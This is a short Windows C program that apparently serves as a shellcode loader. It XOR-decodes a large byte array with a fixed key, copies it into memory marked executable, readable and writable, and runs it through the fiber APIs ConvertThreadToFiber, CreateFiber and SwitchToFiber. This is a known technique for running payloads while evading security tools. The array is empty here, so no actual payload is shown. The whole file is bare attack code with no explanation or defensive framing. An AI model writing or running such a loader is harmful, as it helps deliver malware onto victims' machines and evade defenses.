#include <windows.h>

void like() {

    unsigned char data[265728] = {};


    LPVOID fiber = ConvertThreadToFiber(NULL);
    LPVOID Alloc = VirtualAlloc(NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    for (int i = 0; i < sizeof(data); i++)
    {
        data[i] ^= 85;
    }
    CopyMemory(Alloc, data, sizeof(data));
    LPVOID shellFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)Alloc, NULL);
    SwitchToFiber(shellFiber);
}

int main() {
    like();
}
